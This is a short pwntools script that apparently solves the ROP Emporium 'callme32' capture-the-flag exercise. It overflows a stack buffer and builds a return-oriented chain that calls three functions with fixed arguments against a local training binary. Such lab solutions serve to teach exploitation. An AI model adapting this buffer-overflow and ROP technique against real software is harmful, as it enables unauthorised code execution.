#!/bin/python3

from pwn import *

programm = "./callme32"

p = process(programm)
elf = ELF(programm)
p.recvuntil(">")

# Functions
callme_one = p32(elf.sym.callme_one)        # 0x080484f0
callme_two = p32(elf.sym.callme_two)        # 0x08048550
callme_three = p32(elf.sym.callme_three)    # 0x080484e0

# Function params
params = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

popall = p32(0x080487f9) # pop esi; pop edi; pop ebp; ret

payload = b""
payload += b"A" * 44 # padding

# Call Functions
payload += callme_one
payload += popall
payload += params

payload += callme_two
payload += popall
payload += params

payload += callme_three
payload += popall
payload += params

p.sendline(payload)

print(p.recvall())
